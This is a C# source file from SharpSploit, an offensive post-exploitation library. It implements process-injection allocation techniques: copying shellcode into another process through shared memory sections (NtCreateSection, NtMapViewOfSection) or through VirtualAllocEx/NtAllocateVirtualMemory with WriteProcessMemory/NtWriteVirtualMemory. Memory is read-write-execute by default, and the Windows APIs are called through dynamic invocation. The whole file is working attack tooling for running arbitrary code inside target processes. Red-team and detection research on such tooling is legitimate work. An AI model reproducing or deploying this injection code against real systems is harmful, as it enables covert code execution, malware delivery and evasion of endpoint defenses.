﻿using System;
using System.Linq;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpSploit.Execution.Injection
{
    /// <summary>
    /// Base class for allocation techniques.
    /// </summary>
    public abstract class AllocationTechnique
    {
        // An array containing a set of PayloadType objects that are supported.
        protected Type[] supportedPayloads;

        /// <summary>
        /// Informs objects using this technique whether or not it supports the type of a particular payload.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">A payload.</param>
        /// <returns>Whether or not the payload is of a supported type for this strategy.</returns>
        public abstract bool IsSupportedPayloadType(PayloadType Payload);

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        internal abstract void DefineSupportedPayloadTypes();

        /// <summary>
        /// Allocate the payload to the target process at a specified address.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The payload to allocate to the target process.</param>
        /// <param name="Process">The target process.</param>
        /// <param name="Address">The address at which to allocate the payload in the target process.</param>
        /// <returns>True when allocation was successful. Otherwise, throws relevant exceptions.</returns>
        public virtual IntPtr Allocate(PayloadType Payload, Process Process, IntPtr Address)
        {
            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(Process), Address.GetType() };

            try
            {
                // Get delegate to the overload of Allocate that supports the type of payload passed in
                MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);

                // Dynamically invoke the appropriate Allocate overload
                return (IntPtr)allocate.Invoke(this, new object[] { Payload, Process, Address });
            }
            // If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(Payload.GetType());
            }
        }

        /// <summary>
        /// Allocate the payload to the target process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The payload to allocate to the target process.</param>
        /// <param name="Process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public virtual IntPtr Allocate(PayloadType Payload, Process Process)
        {

            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(Process) };

            try
            {
                // Get delegate to the overload of Allocate that supports the type of payload passed in
                MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);

                // Dynamically invoke the appropriate Allocate overload
                return (IntPtr)allocate.Invoke(this, new object[] { Payload, Process });
            }
            // If there is no such method
            catch (ArgumentNullException)
            {
                throw new PayloadTypeNotSupported(Payload.GetType());
            }
        }
    }

    /// <summary>
    /// Allocates a payload to a target process using locally-written, remotely-copied shared memory sections.
    /// </summary>
    public class SectionMapAlloc : AllocationTechnique
    {
        // Publically accessible options

        public uint localSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
        public uint remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
        public uint sectionAttributes = Win32.WinNT.SEC_COMMIT;

        /// <summary>
        /// Default constructor.
        /// </summary>
        public SectionMapAlloc()
        {
            DefineSupportedPayloadTypes();
        }

        /// <summary>
        /// Constructor allowing options as arguments.
        /// </summary>
        public SectionMapAlloc(uint localPerms = Win32.WinNT.PAGE_EXECUTE_READWRITE, uint remotePerms = Win32.WinNT.PAGE_EXECUTE_READWRITE, uint atts = Win32.WinNT.SEC_COMMIT)
        {
            DefineSupportedPayloadTypes();
            localSectionPermissions = localPerms;
            remoteSectionPermissions = remotePerms;
            sectionAttributes = atts;
        }

        /// <summary>
        /// States whether the payload is supported.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">Payload that will be allocated.</param>
        /// <returns></returns>
        public override bool IsSupportedPayloadType(PayloadType Payload)
        {
            return supportedPayloads.Contains(Payload.GetType());
        }

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// Update when new types of payloads are added.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        internal override void DefineSupportedPayloadTypes()
        {
            //Defines the set of supported payload types.
            supportedPayloads = new Type[] {
                typeof(PICPayload)
            };
        }

        /// <summary>
        /// Allocate the payload to the target process. Handles unknown payload types.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The payload to allocate to the target process.</param>
        /// <param name="Process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public override IntPtr Allocate(PayloadType Payload, Process Process)
        {
            if (!IsSupportedPayloadType(Payload))
            {
                throw new PayloadTypeNotSupported(Payload.GetType());
            }
            return Allocate(Payload, Process, IntPtr.Zero);
        }

        /// <summary>
        /// Allocate the payload in the target process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The PIC payload to allocate to the target process.</param>
        /// <param name="Process">The target process.</param>
        /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress)
        {
            // Get a convenient handle for the target process.
            IntPtr procHandle = Process.Handle;

            // Create a section to hold our payload
            IntPtr sectionAddress = CreateSection((uint)Payload.Payload.Length, sectionAttributes);

            // Map a view of the section into our current process with RW permissions
            SectionDetails details = MapSection(Process.GetCurrentProcess().Handle, sectionAddress,
                localSectionPermissions, IntPtr.Zero, Convert.ToUInt32(Payload.Payload.Length));

            // Copy the shellcode to the local view
            System.Runtime.InteropServices.Marshal.Copy(Payload.Payload, 0, details.baseAddr, Payload.Payload.Length);

            // Now that we are done with the mapped view in our own process, unmap it
            Native.NTSTATUS result = UnmapSection(Process.GetCurrentProcess().Handle, details.baseAddr);

            // Now, map a view of the section to other process. It should already hold the payload.

            SectionDetails newDetails;

            if (PreferredAddress != IntPtr.Zero)
            {
                // Attempt to allocate at a preferred address. May not end up exactly at the specified location.
                // Refer to MSDN documentation on ZwMapViewOfSection for details.
                newDetails = MapSection(procHandle, sectionAddress, remoteSectionPermissions, PreferredAddress, (ulong)Payload.Payload.Length);
            }
            else
            {
                newDetails = MapSection(procHandle, sectionAddress, remoteSectionPermissions, IntPtr.Zero, (ulong)Payload.Payload.Length);
            }
            return newDetails.baseAddr;
        }

        /// <summary>
        /// Creates a new Section.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="size">Max size of the Section.</param>
        /// <param name="allocationAttributes">Section attributes (eg. Win32.WinNT.SEC_COMMIT).</param>
        /// <returns></returns>
        private static IntPtr CreateSection(ulong size, uint allocationAttributes)
        {
            // Create a pointer for the section handle
            IntPtr SectionHandle = new IntPtr();
            ulong maxSize = size;

            Native.NTSTATUS result = DynamicInvoke.Native.NtCreateSection(
                ref SectionHandle,
                0x10000000,
                IntPtr.Zero,
                ref maxSize,
                Win32.WinNT.PAGE_EXECUTE_READWRITE,
                allocationAttributes,
                IntPtr.Zero
            );
            // Perform error checking on the result
            if (result < 0)
            {
                return IntPtr.Zero;
            }
            return SectionHandle;
        }

        /// <summary>
        /// Maps a view of a section to the target process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="procHandle">Handle the process that the section will be mapped to.</param>
        /// <param name="sectionHandle">Handle to the section.</param>
        /// <param name="protection">What permissions to use on the view.</param>
        /// <param name="addr">Optional parameter to specify the address of where to map the view.</param>
        /// <param name="sizeData">Size of the view to map. Must be smaller than the max Section size.</param>
        /// <returns>A struct containing address and size of the mapped view.</returns>
        public static SectionDetails MapSection(IntPtr procHandle, IntPtr sectionHandle, uint protection, IntPtr addr, ulong sizeData)
        {
            // Copied so that they may be passed by reference but the original value preserved
            IntPtr baseAddr = addr;
            ulong size = sizeData;

            uint disp = 2;
            uint alloc = 0;

            // Returns an NTSTATUS value
            Native.NTSTATUS result = DynamicInvoke.Native.NtMapViewOfSection(
                sectionHandle, procHandle,
                ref baseAddr,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                ref size, disp, alloc,
                protection
            );

            // Create a struct to hold the results.
            SectionDetails details = new SectionDetails(baseAddr, sizeData);

            return details;
        }


        /// <summary>
        /// Holds the data returned from NtMapViewOfSection.
        /// </summary>
        public struct SectionDetails
        {
            public IntPtr baseAddr;
            public ulong size;

            public SectionDetails(IntPtr addr, ulong sizeData)
            {
                baseAddr = addr;
                size = sizeData;
            }
        }

        /// <summary>
        /// Unmaps a view of a section from a process.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="hProc">Process to which the view has been mapped.</param>
        /// <param name="baseAddr">Address of the view (relative to the target process)</param>
        /// <returns></returns>
        public static Native.NTSTATUS UnmapSection(IntPtr hProc, IntPtr baseAddr)
        {
            return DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
        }
    }

    /// <summary>
    /// Allocates a payload to a target process using VirtualAllocateEx and WriteProcessMemory
    /// </summary>
    /// <author>aus</author>
    public class VirtualAllocate : AllocationTechnique
    {
        // Publically accessible options

        public Win32.Kernel32.AllocationType allocationType = (Win32.Kernel32.AllocationType.Reserve | Win32.Kernel32.AllocationType.Commit);
        public Win32.Kernel32.MemoryProtection memoryProtection = Win32.Kernel32.MemoryProtection.ExecuteReadWrite;
        public AllocAPIS allocAPI = AllocAPIS.VirtualAllocEx;
        public WriteAPIS writeAPI = WriteAPIS.WriteProcessMemory;

        public enum AllocAPIS : int
        {
            VirtualAllocEx = 0,
            NtAllocateVirtualMemory = 1
        };

        public enum WriteAPIS : int
        {
            WriteProcessMemory = 0,
            NtWriteVirtualMemory = 1
        };

        /// <summary>
        /// Default constructor.
        /// </summary>
        public VirtualAllocate()
        {
            DefineSupportedPayloadTypes();
        }

        /// <summary>
        /// Constructor allowing options as arguments.
        /// </summary>
        public VirtualAllocate(
            Win32.Kernel32.AllocationType alloctype = (Win32.Kernel32.AllocationType.Reserve | Win32.Kernel32.AllocationType.Commit),
            Win32.Kernel32.MemoryProtection memprotect = Win32.Kernel32.MemoryProtection.ExecuteReadWrite,
            AllocAPIS alloc = AllocAPIS.VirtualAllocEx,
            WriteAPIS write = WriteAPIS.WriteProcessMemory)
        {
            DefineSupportedPayloadTypes();
            allocationType = alloctype;
            memoryProtection = memprotect;
            allocAPI = alloc;
            writeAPI = write;
        }

        /// <summary>
        /// States whether the payload is supported.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">Payload that will be allocated.</param>
        /// <returns></returns>
        public override bool IsSupportedPayloadType(PayloadType Payload)
        {
            return supportedPayloads.Contains(Payload.GetType());
        }

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// Update when new types of payloads are added.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        internal override void DefineSupportedPayloadTypes()
        {
            //Defines the set of supported payload types.
            supportedPayloads = new Type[] {
                typeof(PICPayload)
            };
        }

        /// <summary>
        /// Allocate the payload to the target process. Handles unknown payload types.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="Payload">The payload to allocate to the target process.</param>
        /// <param name="Process">The target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public override IntPtr Allocate(PayloadType Payload, Process Process)
        {
            if (!IsSupportedPayloadType(Payload))
            {
                throw new PayloadTypeNotSupported(Payload.GetType());
            }
            return Allocate(Payload, Process, IntPtr.Zero);
        }

        /// <summary>
        /// Allocate the payload in the target process via VirtualAllocEx + WriteProcessMemory
        /// </summary>
        /// <author>The Wover (@TheRealWover), aus (@aus)</author>
        /// <param name="Payload">The PIC payload to allocate to the target process.</param>
        /// <param name="Process">The target process.</param>
        /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress = new IntPtr())
        {
            // Get a convenient handle for the target process.
            IntPtr procHandle = Process.Handle;

            // Allocate some memory
            IntPtr regionAddress = PreferredAddress;

            if (allocAPI == AllocAPIS.VirtualAllocEx)
            {
                regionAddress = DynamicInvoke.Win32.VirtualAllocEx(procHandle, PreferredAddress, (uint)Payload.Payload.Length, allocationType, memoryProtection);

                if (regionAddress == IntPtr.Zero)
                {
                    throw new AllocationFailed(Marshal.GetLastWin32Error());
                }
            }

            else if (allocAPI == AllocAPIS.NtAllocateVirtualMemory)
            {
                IntPtr regionSize = new IntPtr(Payload.Payload.Length);

                DynamicInvoke.Native.NtAllocateVirtualMemory(procHandle, ref regionAddress, IntPtr.Zero, ref regionSize, (uint) allocationType, (uint) memoryProtection);

            }

            if (writeAPI == WriteAPIS.WriteProcessMemory)
            {
                // Copy the shellcode to allocated memory
                bool retVal = DynamicInvoke.Win32.WriteProcessMemory(procHandle, regionAddress, Payload.Payload, (Int32)Payload.Payload.Length, out IntPtr bytesWritten);

                if (!retVal)
                {
                    throw new MemoryWriteFailed(Marshal.GetLastWin32Error());
                }
            }
            else if (writeAPI == WriteAPIS.NtWriteVirtualMemory)
            {
                GCHandle handle = GCHandle.Alloc(Payload.Payload, GCHandleType.Pinned);
                IntPtr payloadPtr = handle.AddrOfPinnedObject();

                uint BytesWritten = DynamicInvoke.Native.NtWriteVirtualMemory(procHandle, regionAddress, payloadPtr, (uint)Payload.Payload.Length);

                if (BytesWritten != (uint)Payload.Payload.Length)
                    throw new MemoryWriteFailed(0);
            }

            return regionAddress;
        }
    }

    /// <summary>
    /// Exception thrown when the payload memory fails to allocate
    /// </summary>
    public class AllocationFailed : Exception
    {
        public AllocationFailed() { }

        public AllocationFailed(int error) : base(string.Format("Memory failed to allocate with system error code: {0}", error)) { }
    }

    /// <summary>
    /// Exception thrown when the memory fails to write
    /// </summary>
    public class MemoryWriteFailed : Exception
    {
        public MemoryWriteFailed() { }

        public MemoryWriteFailed(int error) : base(string.Format("Memory failed to write with system error code: {0}", error)) { }
    }
}